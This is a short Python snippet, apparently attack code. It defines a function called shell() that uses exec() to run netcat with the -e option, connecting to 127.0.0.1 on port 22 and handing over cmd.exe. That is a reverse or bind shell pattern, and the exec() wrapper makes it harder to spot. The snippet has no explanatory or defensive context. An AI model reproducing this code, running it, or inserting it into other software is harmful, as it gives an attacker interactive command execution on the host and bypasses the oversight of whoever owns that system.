def shell():
    exec("import subprocess as sp\nsp.run('nc -nv 127.0.0.1 22 -e cmd.exe')\nprint()")
